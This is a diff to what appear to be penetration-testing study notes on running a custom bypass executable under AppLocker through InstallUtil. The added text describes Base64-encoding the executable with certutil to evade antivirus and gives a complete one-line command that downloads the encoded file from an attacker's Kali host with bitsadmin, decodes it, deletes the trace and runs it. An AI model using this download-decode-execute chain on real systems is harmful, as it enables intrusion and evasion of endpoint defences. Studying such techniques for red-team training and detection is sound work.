@@ -65,5 +65,18 @@ To trigger our constrained language mode bypass code, we must invoke it through 
 
 At this point, it would be possible to reuse this tradecraft with the Microsoft Word macros we developed earlier since they are not limited by AppLocker. Instead of using WMI to directly start a PowerShell process and download the shellcode runner from our Apache web server, we could make WMI execute InstallUtil and obtain the same result despite AppLocker.
 
-the compiled C# file has to be on disk when InstallUtil is invoked. 
+The compiled C# file has to be on disk when InstallUtil is invoked. This requires two distinct actions. First, we must download an executable, and secondly, we must ensure that it is not flagged by antivirus, neither during the download process nor when it is saved to disk. we can use other native Windows binaries, which are whitelisted by default.
+
+To attempt to bypass anitvirus, we are going to obfuscate the executable while it is being downloaded with Base64 encoding and then decode it on disk. Well use the native certutil3 tool to perform the encoding and decoding and bitsadmin for the downloading.
+
+Base64 encoding the executable with certutil: 
+
+      cmd> certutil -encode C:\Users\\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
+
+Certutil can also be used to download files over HTTP(S), but this triggers antivirus due to its widespread malicious usage. 
+
+Complete combined command to download, decode and execute the bypass: 
+
+      cmd>bitsadmin /Transfer myJob http://<kali ip>/file.txt C:\users\enc.txt && certutil -decode C:\users\enc.txt C:\users\Bypass.exe && del C:\users\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\Bypass.exe
+
 
